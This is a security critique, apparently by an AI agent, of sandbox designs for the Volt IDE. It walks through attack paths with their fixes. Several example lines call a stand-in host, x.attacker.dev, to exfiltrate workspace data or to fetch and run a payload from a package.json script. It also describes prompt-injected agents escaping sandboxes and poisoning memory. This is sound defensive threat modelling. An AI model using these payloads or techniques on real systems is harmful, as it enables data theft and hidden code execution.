# Critique: claude-b (red team), round 2

Author: `claude-b` (Opus 5.5). Lens: threat model, supply chain, first-party "allow all", permission UX.

I read all five proposals: `grok.md`, `claude-a.md`, `sol.md`, `terra.md` and my own `claude-b.md`. None was missing.

Conventions:
- `main:` is this checkout. `sbx:` is `feat/volt-sandbox`, read with `git show`.
- **Verified** means I read the code in this round. **Guess** means I did not.
- Each objection gives: the proposal, section and claim; what the attacker controls; each hop; what the attacker ends up with; the fix.

## 1. Objections

Ranked by how much damage the gap allows. O1–O4 are present in several proposals, so the synthesis cannot pick one proposal and inherit its gap unchanged.

### O1. "Network none" for T3 is not enforced: the VS Code API has its own ways out (all four T3 designs)

**Claims:**
- grok §9: the T3 default is "network `none`".
- terra §9.1: "Proxy … prompts once per extension".
- sol §2/§9: T3 has "no secrets/network".
- claude-a §2.4: "A T3 extension that ignores the Volt API … hits Seatbelt/bwrap".

Each one counts the extension host's own sockets as the only exit. They aren't.

**What the attacker controls:** a VS Code extension with no manifest, installed from Open VSX (GlassWorm class).

**Attack path:**
1. The extension activates on `*` and reads the workspace. Every proposal grants workspace read by default. `.env*` is denied, but source, `config/*.yml`, `terraform.tfstate` and `*.pem` under the repo are not; `CREDENTIAL_HOME_PATHS` only covers home-relative paths (verified, `sbx:src/vs/platform/voltSandbox/common/sandboxProfiles.ts:20-29`).
2. It calls `vscode.window.createWebviewPanel(..., { enableScripts: true })` and sets its own CSP in `webview.html`, for example `default-src * 'unsafe-inline'`. VS Code lets the extension write that CSP.
3. It sends the files to the webview with `postMessage`.
4. Script in the webview runs `fetch('https://x.attacker.dev', {method: 'POST', body})`. The webview is an iframe in the workbench renderer, so the request uses the renderer's network stack. It never passes through the extension host's Seatbelt/bwrap/MXC profile or the per-host proxy.
5. A second channel needs no webview at all: `vscode.env.openExternal(Uri.parse('https://x.attacker.dev/?d=' + chunk))`. This goes to the main thread through `MainThreadWindow.$openUri` and opens the user's browser (`main:src/vs/workbench/api/browser/mainThreadWindow.ts:69`, `openExternal: true`). Other renderer-side fetches work the same way: markdown preview with remote images, and `simpleBrowser.show`.

**What they get:** the whole workspace, sent out of a host whose attestation says `network: enforced`. The dashboard would show "Sandboxed" (claude-a §8.5) while data leaves.

**Fix (adopt in the PRD):**
- **Core writes the CSP for every T3 webview.** The extension can add to it but never widen it: `connect-src`, `img-src`, `media-src`, `frame-src`, `form-action` and `font-src` are limited to the webview resource scheme plus the extension's granted `net.connect` hosts. claude-a already does this for `voltPanels` ("no `connect-src`", §2.5). Extend it to VS Code webviews.
- **Enforce it below the CSP.** Electron main filters requests by webview origin and extension id using `session.webRequest` (**guess** on the exact mechanism: VS Code webview iframes share the workbench session, so we need a map from frame origin to extension id).
- **`openExternal`, `env.asExternalUri` and command-based navigation** from an extension that lacks `net.connect` for the target host: Volt shows its own confirm with the full URL, and enforces a length cap and a per-extension budget.
- **Attestation lists "webview egress"** as its own dimension. Until that filter exists, the dimension shows `partial`.

### O2. Shared extension hosts let any co-hosted extension read every other extension's secrets (grok §2/§3.5/§13, terra §2, claude-a §2.1/§9.1)

**Claims:**
- grok: "One Node extension host per trust label … all T3 together is acceptable only while every one of them has the same restricted policy."
- terra: "one sandboxed ext host per publisher (cap 8, then shared 'untrusted pool')."
- claude-a: a single sandboxed `bootstrap-fork` host, "widened per extension by granted capabilities". One process cannot carry a different OS policy per extension.

**Why "same OS policy" is not enough:** the dangerous rights in an extension host are API rights, not OS rights. On main, `MainThreadSecretState.$getPassword(extensionId: string, key: string)` takes the extension id **from the extension host** and looks up `getKey(extensionId, key)` (verified, `main:src/vs/workbench/api/browser/mainThreadSecretState.ts:38-44`). The main thread does not bind that id to the caller.

**What the attacker controls:** extension M, sharing a host with a legitimate extension L that stores a token. Examples: a GitHub or GitLab extension, or a database client storing a connection string.

**Attack path:**
1. All extensions in a host share one Node realm. M reaches the RPC proxy for `MainThreadSecretState`, for example by patching the module cache or `ExtHostSecretState` before L activates (**guess** on the easiest route; any same-realm code can do it).
2. M calls `$getPassword('<L's id>', '<key>')` and gets L's token.
3. M can also wrap `vscode.authentication.getSession` to capture L's OAuth session.
4. M sends the token out through O1, or through L's network grant if the host proxy is shared. terra's "untrusted pool" shares one proxy.

**What they get:** cross-extension credential theft, with the OS sandbox fully intact.

**Fix:**
- **One extension per host**, as sol §2 says. A pool is allowed only for extensions with no `main` entry (themes, grammars, snippets). Those don't need a host at all.
- Hosts start lazily and stop after 5 minutes idle (claude-a §2.2) to keep memory down.
- **`MainThreadSecretState` and `MainThreadAuthentication` check** that `extensionId` belongs to the host's connection. With one extension per host this is a single equality check, and it turns a convention into enforcement.
- Defense in depth: VS Code's built-in `vscode.git`, GitHub authentication and similar get their own host, never a pooled one.

### O3. A signed manifest is not a limit when the same key signs it (grok §7, terra §7, claude-a §7.1, sol §7)

**Claims:**
- terra: "A compromised Volt release key then yields 'the union of declared first-party capabilities', not 'everything'."
- grok: the release key "signs the VSIX and a capability manifest"; "until then [no HSM], sign with the same key that signs the desktop build, and pin it in the app."
- claude-a: CODEOWNERS on manifests makes widening "a reviewed event".
- sol: the catalogue key silently grants `silentlyGrantedCapabilities`; "a capability increase requires catalogue review."

**What the attacker controls:** the plugin or catalogue signing key, or any workflow that can read it. That second group is already large on main:
- Every release workflow passes the signing secrets with `secrets: inherit` and no protected Environment (verified: `.github/workflows/volt-stable.yml:30,43`, `volt-beta.yml:29`, `volt-nightly.yml:46`, `volt-build.yml:599`).
- The nightly workflow runs on `schedule` and `workflow_dispatch` (`volt-nightly.yml:3-6`).
- Actions are pinned by tag, not SHA (`actions/cache@v6`, `actions/checkout@v7`, …, `volt-build.yml:52-254`).

**Attack path:**
1. The attacker gets code into any job that inherits secrets. Examples: a merged PR touching a script the nightly runs, a poisoned build cache restored by the release job (**guess** that a path exists; the release job does restore `actions/cache`), or a moved tag on an action.
2. They build `volt.usage 0.0.7` with a manifest declaring `files.read:home`, `process.exec` and `net.connect:*`, and sign both the code and the manifest.
3. Results under each design:
   - **terra:** the plugin is pre-granted without a prompt. "The union of declared capabilities" is whatever the attacker declared.
   - **grok:** a capability-diff prompt appears, branded "Volt Usage (by Volt)". Users approve their IDE vendor's prompt almost every time, so in practice it is a speed bump.
   - **claude-a:** CODEOWNERS protects the repo, and a stolen key never goes through a PR.
   - **sol:** "catalogue review" is a process. The catalogue signature is the only thing the client checks.

**What they get:** silent, signed, user-level code execution on every install that auto-updates. This is the outcome "allow all" was supposed to avoid.

**Extra hole in grok's interim plan:** builds without certificates are ad-hoc signed on macOS and unsigned on Windows (`main:build/volt/release/darwin-package.sh:43-51`, `win32-sign.ps1:15-16`, cited in my round 1). On those builds there is no desktop key to pin. First-party verification then either fails open or blocks every first-party plugin, and the first is what will ship under deadline. A Developer ID or Authenticode certificate is also an X.509 code-signing certificate, not a key for signing manifests.

**Fix:**
- **The limit has to live in a different trust root from the plugin.**
  - The ceiling table (`pluginId → maximum capabilities`) is compiled into the core binary, which the OS verifies.
  - A plugin is pre-granted `requested ∩ ceiling`, never `requested`.
  - Widening the ceiling needs a core release. That makes it a two-key rule (my round 1 §7.3, the AOSP privapp allowlist model).
- First-party plugin targets need threshold 2 in TUF: the CI KMS key plus an independent rebuilder key that signs only when the reproducible bytes match.
- Signing runs only in a protected GitHub Environment `release` with required reviewers. Remove `secrets: inherit` from nightly and beta.
- The plugin key is never the desktop code-signing certificate.

### O4. Unmanifested T3 gets raw workspace write, and claude-a adds `*` public network, so build files become persistence (claude-a §9.1, terra §9.1, grok §9 via presets, my own round 1 §9.1)

**Claims:**
- claude-a: "Write: workspace … Network: `proxy`, with `*` *public* hosts allowed … The protection that matters, credentials and persistence, is filesystem."
- terra: "FS write: Workspace (minus protected paths)."

**Why the protected list doesn't save us:** the protected list is hooks and config (verified, `sbx:…/sandboxProfiles.ts:42-58`: `.husky`, `.githooks`, `.vscode`, `.git/hooks` …). The files that build tools *execute* are not on it, and can't be, because they are ordinary source: `package.json` `scripts.prepare`/`postinstall`, `Makefile`, `build.rs`, `.cargo/config.toml` (`[build] rustc-wrapper`), `pyproject.toml` build backends, `gradlew`, `.github/workflows/*.yml`.

**What the attacker controls:** a "theme + snippets" extension with no manifest.

**Attack path:**
1. It reads the repo (default read).
2. Under claude-a, it uploads the repo to `x.attacker.dev` directly, because `*` public is allowed. Under the others it uses O1.
3. It edits `package.json` to add `"prepare": "node -e \"require('https').get('https://x.attacker.dev/s',r=>r.pipe(require('fs').createWriteStream('/tmp/.s')))\" && sh /tmp/.s"`.
4. The user's next `npm install` in their own terminal runs it outside any sandbox (grok §1 puts the user's terminal out of scope). The change can also be committed and pushed, poisoning CI.

**What they get:** exfiltration of the repo plus time-shifted code execution as the user and in CI. grok's consumer guard (E14) covers only hooks and tasks, so it doesn't see this.

**Fix:**
- **No raw workspace write for unmanifested T3.** Formatters, refactorings and code actions already return `TextEdit` / `WorkspaceEdit` through the API, and the main thread applies them. They never needed `fs.write`.
- Raw write is a `medium`-class grant shown at install, never a default.
- Network for unmanifested T3 is `none` plus a first-use prompt naming the host (terra and my round 1), never `*`.
- Extend grok's E14 snapshot-and-diff guard to a **build-entry list** (`package.json` scripts, `Makefile`, `.cargo/config.toml`, `build.rs`, `.github/workflows/**`, `pyproject.toml` `[build-system]`). Volt shows the diff before Volt itself runs a task, install or commit after a sandboxed write. The user's own terminal stays out of scope, and the diff card says so once.
- I concede my round 1 §9.1 had a smaller version of this hole: "write the workspace when … the extension contributes languages/formatters/linters". Formatters don't need it. That clause is withdrawn.

### O5. `extensionKind: ui` lets the attacker choose the unsandboxed tier (claude-a §9.1)

**Claim:** "`extensionKind: ui` extensions that need the window's host stay in the local host, unsandboxed, and are labelled 'Not sandboxed'."

**What the attacker controls:** `extensionKind` is a field in the attacker's own `package.json`.

**Attack path:**
1. The GlassWorm-class extension declares `"extensionKind": ["ui"]`.
2. It loads in the desktop `utilityProcess` host (`main:src/vs/platform/extensions/electron-main/extensionHostStarter.ts:77`), which no wrapper can confine (brief §2).
3. It reads `~/.ssh`, runs `security find-generic-password`, writes `~/Library/LaunchAgents/*.plist`.

**What they get:** full user access. The only "control" is a chip in the Extensions view, which no one reads before the extension activates.

**Fix:**
- A third-party `ui`-kind extension goes to the web-worker host if it has a `browser` entry. Otherwise it does not activate until the user takes a per-extension "Run with your full access" action: critical class, typed confirmation, signer-pinned, and re-acknowledged on **every** update (an update is exactly when GlassWorm strikes).
- terra's "user-marked Run unsandboxed" escape hatch (§2) needs the same per-version re-acknowledgement.

### O6. "Audit mode" for first-party OS policy means two releases with no sandbox (terra §3.3/§7, claude-a §6.4 W0)

**Claim (terra):** the T1 host "runs under the compiled policy with `audit: true` for the first two releases after it moves to T1"; `audit` is a policy field that "only trusted layers may set (first-party during rollout, or the user)."

**Why it fails:**
1. **bwrap cannot audit.** A path that is not mounted cannot be logged as a "would-deny", and a path that is mounted cannot be denied. So OS-level audit on Linux means mounting everything.
2. **Seatbelt audit** is `(allow … (with report))`, which allows everything.
3. **First-party manifests are a trusted layer** in terra's composition (layer 2), so a compromised first-party manifest can set `audit: true` on itself. Combined with O3, that is allow-all.

**Attack path:**
1. A prompt-injected agent passes crafted input to a first-party T1 tool (memory, playgrounds, commit review) during the audit window.
2. A bug in that tool gives code execution in the first-party extension host on volt-server.
3. `fs.readFile('~/.ssh/id_ed25519')` is logged as a would-deny and succeeds.

**Fix:**
- Audit mode exists only at the **API capability layer** (claude-a's W0 facade audit is fine there).
- The **OS floor** is enforced from the first release for every host, first-party included: credential denies, protected paths, Volt listeners and sockets, `~/.volt/**`, LaunchAgents and Run keys.
- `audit` is a core build constant, never a policy field any manifest can set.

### O7. Security switches stored as ordinary settings can be flipped by a malicious repo (terra §12 and §7, grok §4.1)

**Claims:**
- terra: `volt.sandbox.mode: off | audit | enforce` per tier, `volt.extensions.sandboxedHosts: off | firstParty | all`, `volt.extensions.allowUnsigned: "ask" | "never"`.
- grok: the `volt.sandbox.windowsBackend` preference.

**What the attacker controls:** a cloned repository with a committed `.vscode/settings.json`.

**Attack path:**
1. The repo ships `{"volt.sandbox.mode": "off", "volt.sandbox.windowsBackend": "sandbox-user"}`.
2. `.vscode` is protected against *sandboxed writes* (`sandboxProfiles.ts:44`), but this file arrived with the clone, so no write was needed.
3. Unless each key is registered with `scope: application` and listed in `restrictedConfigurations`, workspace settings override user settings once the folder is trusted. Users click "Trust" on nearly every folder they open.
4. On Windows, grok's preference switch moves the chat from MXC down to the shared-SID backend (O8).

**What they get:** the sandbox disabled or weakened for every chat in that repo, with no prompt.

**Fix:**
- Security switches live in Volt user data (`~/.volt/trust/`, denied to every sandbox), not in `settings.json`. This is my round 1 §7.6 rule for developer mode, applied to every switch.
- Any switch that stays a setting is `APPLICATION`-scoped. A workspace or remote source may only *narrow* it (`enforce` wins over `audit`/`off`; `never` wins over `ask`).
- `product.json`'s `minimumMode` (terra) stays the floor.

### O8. grok's sandbox-user backend shares one Windows SID across every sandbox, and its file-access entries outlive the run (grok §4.1)

**Claims:** "One elevated install creates a local user `volt-sandbox` … the workspace grant is an ACL on the real path for that SID", with "a random password held in an ACL'd secret the SYSTEM service can read".

**What the attacker controls:** a prompt-injected agent in chat B (project Y). It is routed to sandbox-user because it runs Git Bash, which is grok's own routing rule for MSYS.

**Attack path:**
1. Chat A (project X) received `fs.write:${workspace}`. That is an access-control entry granting `volt-sandbox` write on `C:\src\X`.
2. While A is running, or after Volt crashes before removing the entry (there is no removal step in the design, and a crash skips any cleanup), chat B runs as the **same** SID.
3. B writes `C:\src\X\package.json` (O4's payload). The protected paths are applied as deny entries for B's own workspace only, not for X.

**What they get:** a sandbox in one project writing into another project. Running two chats at once is enough; no crash is needed.

**A second problem:** either the password can be read in the user's session, so any same-user process can log on as `volt-sandbox`, or a SYSTEM service holds it. A SYSTEM service that accepts launch requests from the user's session is a new privilege-escalation surface that Volt would have to own.

**Fix:**
- Don't ship sandbox-user in v1 (terra §4, and my round 1).
- If a legacy backend is built later, it needs a distinct identity per run: a restricted token with a run-unique SID in its restricting set and file entries keyed to that SID. Entries are removed when the job closes, and a sweep at startup removes leftovers from crashed runs.
- No SYSTEM service.

### O9. One T2 process for every `volt` plugin merges their limits (claude-a §2.2)

**Claim:** "`volt.*` first-party plugins share one host … we only co-host plugins that share a publisher, and therefore a signer and a trust decision." Identity is bound to "the channel (fd 3 of that process)".

**Why it fails:** the same signer does not mean the same limits. With identity per process, the core cannot tell `memory` apart from `provider-openrouter` or `usage`. With identity per worker MessagePort inside the process, an SES escape forges it (claude-a's own §2.2 argument). Either way, the process acts as the union of all 15 dogfood plugins.

**What the attacker controls:** text an agent writes into memory. The agent is prompt-injected by a repo or web page.

**Attack path:**
1. The `memory` T2 plugin parses the text.
2. A parser bug plus a missed intrinsic gives an SES escape. claude-a §13 itself calls SES-in-`worker_threads` on Node 22 lightly tested.
3. The escaped code calls `volt.net.fetch('https://openrouter.ai/api/v1/chat/completions', {auth: 'secret:openrouter.key'})` in a loop. That is `provider-openrouter`'s grant, used for spending money (DSec's cost-exhaustion class).
4. It also calls `context.contribute`, which is memory's own grant, to plant an instruction in **every** future chat's prompt.

**What they get:** persistent prompt injection across chats, plus the use of every first-party provider key.

**Fix:**
- One process per plugin for any plugin holding a `high` capability (`secrets.use`, `agents.context`, `agents.send`, `process.exec`).
- Plugins whose capabilities are all `low` can share a process.
- `agents.context` output is labelled with its source plugin in the transcript (claude-a §10 already does this for `agents.send`) and capped in size.

### O10. Smaller issues

- **grok §7, revocation fails open forever.** "Already-installed copies keep running if the list cannot be fetched … stale older than 7 days is shown … not treated as a revoke." A network attacker who blocks one hostname keeps a revoked first-party plugin pre-granted forever.
  - **Fix:** TUF timestamp expiry. When metadata is stale for more than N days, first-party plugins lose *silent* `high`/`critical` grants (they fall back to prompting) instead of losing everything.
- **sol §5 and grok §5, the Windows loopback route is assumed.** Both assume the MXC container can reach a per-principal loopback proxy port. AppContainer blocks loopback by default, and exemptions are normally an administrator operation (**guess** that MXC ProcessContainer behaves like a classic AppContainer here; the srt PR #766 note "proxy routing is guaranteed only by 25H2 behaviour" points the same way). If true, sol's per-principal port on Windows is not buildable.
  - **Fix:** fall back to grok's single port plus a per-principal `Proxy-Authorization` token. Add terra's confirm canary as a release gate for each Windows build.
- **claude-a §4, partial-trust first-party T2 on old Windows.** It adds Node `--permission` as a third layer. The Node documentation itself says the permission model does not protect against malicious code (**guess** on the exact wording; please verify). It catches mistakes only, so attestation must not count it as a layer.

## 2. What I concede and adopt

**From grok**
- **E12 is real (verified).** `narrow()` checks `isReservedEnvName` and `isInjectionEnvName` on untrusted `env.set`, but not `isSecretEnvName` (`sbx:src/vs/platform/voltSandbox/common/sandboxComposition.ts:224-232`). Adopt:
  - the reserve list (`NODE_CHANNEL_FD`, `NODE_OPTIONS`, `VSCODE_*IPC*`, `ELECTRON_RUN_AS_NODE`);
  - "launcher writes channel env last".
- **The Windows chooser with no silent fallback:**
  - classify the program before launch (PE / MSYS / WSL);
  - refuse `wsl.exe`;
  - an MXC confirm that fails kills the run and never retries on another backend.
- **Windows binary planting:** `SetDefaultDllDirectories` and no workspace on `PATH` (E15).
- **E9 file brokers:** directory-fd brokers with `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)`. The hard-link scan is a bounded, labelled residual.
- **E14 consumer-side hook guard:** snapshot hashes plus an empty `core.hooksPath`. I extend it to build-entry files (O4).
- **Host rules:** one container per host (the MXC stall), a per-host `Proxy-Authorization`, and live loopback grants are restart-only.
- **E18:** `host` network mode must still deny Volt's own ports, or be unsupported for untrusted identities on Linux.

**From sol**
- **Identity comes from the launcher.** It is the route plus a token minted by the manager, and workload-supplied ids are ignored. This is stronger than my round 1 "per-subject Proxy-Authorization".
- **Approval by `denialId` + `expectedRevision`:** the server re-derives the rule from the recorded denial, so a client cannot substitute a host. This closes my AT-12 prompt-spoofing branch better than my 500 ms inert-button rule did. I keep both.
- **Remote:** the execution host is the only grant authority, and only owner-role devices approve.
- **Network classes:** loopback, LAN and public are separate grants; metadata ranges are always denied; MCP connection caches are partitioned per principal; packages are fetched under a separate `package-fetch:<lockDigest>` identity; no `npx -y` outside containment.
- **Correction to my round 1:** I said "Launch key includes every grant". I now adopt sol's and grok's model: the launch key covers the *immutable* policy, and network grants attach to the principal in the broker. My version would restart the agent on every "Allow host", which is the UX that makes users switch the sandbox off.

**From claude-a**
- **Declarative UI first** (no script in the window chrome; lists come out as WorkbenchList automatically), with iframes that have no `connect-src`.
- **`volt.net.fetch` with header injection:** plugins use secrets by reference and never read them.
- **Declarative provider probes**, which make T2 spawn-free.
- **Tool schemas in the manifest**, so lazy activation doesn't hide tools.
- **The host channel opens only after confirm.**
- **Server-side enablement** is a real prerequisite.
- **Old Windows:** first-party T2 may run partial; third-party T2/T3 refuse. This replaces my round 1 "T2 still works with SES only" for third party. An SES escape with no OS layer means full user access.

**From terra**
- **The reorder:** harden the agent sandbox first (Phase 0–1, about 11 engineer-weeks), with migration alongside. That is where today's threat is.
- **PR 6, the spawn audit gate,** which closes DeepSeek's `run_code` class.
- **The kill switch may only move to "ask"**, never silently to off.
- **The confirm canary** for long-lived hosts.
- **Providers describe and core launches** ("describe, don't spawn").
- **Narrow-only admin and MDM layer.**
- **Git Bash smoke test** as a Windows acceptance criterion.
- **A T2 adoption kill criterion.**
- **Deep UI stays in-process.** I concede my round 1 "P1 first-party run in the same hosts as T2/T3" was unrealistic for browser, scratch, visuals, devices and customize. Those stay in-process behind the facade (terra's T0p, claude-a's T1). My condition is in the table below.

## 3. Revised position on every disputed decision

| Decision | Round 1 (claude-b) | Revised | Why it moved / what it costs |
|---|---|---|---|
| **Windows backend** | MXC on supported builds | **MXC ProcessContainer via pinned, Authenticode-checked `wxc-exec`**, with grok's chooser and no fallback. MSYS/Git Bash under MXC: refuse with a clear message, offer PowerShell (terra PR 9) | Agreed by all five. Sole open risk is loopback reachability (O10). Fallback design: single proxy port + token, with the canary as gate |
| **Windows below the MXC floor / sandbox-user** | Refuse T3/T4; T2 runs SES-only | **Refuse sandboxed workloads; "Run outside sandbox" per chat. No sandbox-user in v1.** First-party T2 may run `partial`; third-party T2/T3 refuse | O8: one shared SID and leftover file-access entries; a SYSTEM service would be a privilege-escalation surface. Revisit only with per-run SIDs |
| **First-party "allow all"** | No: signed limits (ceilings) compiled into core, auto-granted | **Unchanged and sharper.** Pre-grant = `requested ∩ core ceiling`. Ceiling changes need a core release. Threshold-2 TUF for first-party plugins | O3: every other proposal's limit is signed by the same key as the code. Zero prompts for first-party is kept |
| **First-party in-process tier (T1 / T0p)** | Not planned | **Accepted for deep UI only**: browser, scratch, visuals, devices, customize, computer use. Conditions: (a) no third-party code ever runs there; (b) parsers of agent-written content (charts, diagrams, PR bodies, HTML) run in a worker or iframe, not on the renderer's main thread; (c) the critical native power is in P1-H helpers with narrow RPC. Everything else (providers, memory, usage, git-graph, PRs, commit review, automations, code intelligence, agent resources, skills) goes **out of process** | claude-a's 15 in-process features is too many: the facade and import lint contain mistakes, not runtime compromise. Terra's T0p list is the right size |
| **First-party OS audit mode** | Report mode, one release | **Audit at the API layer only. OS floor enforced from day one. `audit` is never a manifest field** | O6 |
| **T2 placement** | Worker + SES inside a sandboxed process | **Sandboxed process on volt-server.** Process per plugin for any plugin with `high` capabilities; low-only plugins may share a process | O9 |
| **T3 granularity** | Per plugin | **One extension per host; pools only for extensions with no `main` entry.** `MainThreadSecretState` / `Authentication` check the id against the connection | O2 (verified: the id comes from the payload) |
| **T3 default policy** | Read workspace; write if formatter; network none + prompt | **Read workspace (trusted folders); no raw write (edits go through `WorkspaceEdit`); network none + host-naming first-use prompt; webview CSP owned by core; `openExternal` gated; `ui`-kind needs per-version full-access acknowledgement** | O1, O4, O5 |
| **Migration order** | Least to most privileged, ceiling entry in the same PR | **terra's sequence:** Phase 0–1 hardening first (merge, Allow host, policy files, OS gaps, spawn audit, permissions service), then migration. Inside migration, claude-a's waves, with each PR landing manifest + ceiling + capability test together. Nothing moves into an extension host before that host is sandboxed (grok §6) | Agreed with terra, grok and claude-a on the substance. The ceiling-per-PR rule is my condition |
| **Network broker** | Per-subject token; no UDP; loopback and LAN separate | **sol's NetworkBroker**: principal from route + manager token, broker-only DNS, separate public/LAN/loopback, metadata always denied, UDP off in v1, TLS passthrough, terra's SNI = CONNECT check, `denialId`-based approval. Header injection for secret refs (claude-a). **Plus** webview egress filtering (O1) | sol owns this. My addition is O1, which no network design covered |
| **Live grants / launch key** | Launch key includes every grant | **Network grants live on the principal; launch key = immutable policy hash.** Filesystem grants go through the broker or a restart (terra's rule). Grant changes are compare-and-swap against a revision (sol) | Conceded to sol and grok |
| **Signing and keys** | TUF, offline 2-of-3 root, release key in KMS behind a protected Environment, revoke-only key, rebuilder co-signature | **Unchanged.** Added: remove `secrets: inherit` from nightly and beta, pin actions by SHA in signing jobs, never use the desktop certificate as the plugin key (O3) | O3 makes this a prerequisite for any first-party pre-grant |
| **Revocation** | Cached; fail-closed after 30 days for first-party | **TUF timestamp expiry. Stale metadata → first-party loses silent `high`/`critical` grants (prompts instead); nothing is bricked** | O10: grok's "never revoke when stale" fails open forever. Mine bricked too much |
| **Security switches** | Developer mode lives in user data, not settings | **Every security switch** (sandbox mode, unsigned, Windows backend, sandboxed hosts) lives in Volt user data or is an application-scope setting that only narrows | O7 |
| **Permission UX** | Pickers are grants; 5 classes; critical never by prompt; budgets; auto-deny after 2; 500 ms inert; exfil-host list; auto-revoke | **Unchanged, plus sol's `denialId` approval and owner-role remote approval, terra's 2 s coalescing, claude-a's "no prompt from background code".** A "run with full access" action exists only as a critical-class, per-version, typed confirmation | The five proposals agree on the shape; these are the strictest versions of each piece |
| **MCP** | Sandboxed, its own identity | **sol's design:** stdio MCP under SandboxManager with its own principal; effective rights = server ∩ calling chat; HTTP MCP brokered; repo `.mcp.json` untrusted; replace the raw spawn at `main:mcpHost.ts:164-179` | Agreed |

## 4. For the synthesis

Four items are needed in the PRD whichever proposal it builds on, because no single proposal has all of them:

1. Core owns the CSP of T3 webviews, egress from webviews is filtered, and `openExternal` is gated (O1).
2. One extension per host, with the extension id checked against the connection in `MainThreadSecretState` (O2).
3. The first-party limit lives in the core binary, not in the signed manifest (O3).
4. The OS floor is enforced from day one for first-party hosts (O6).
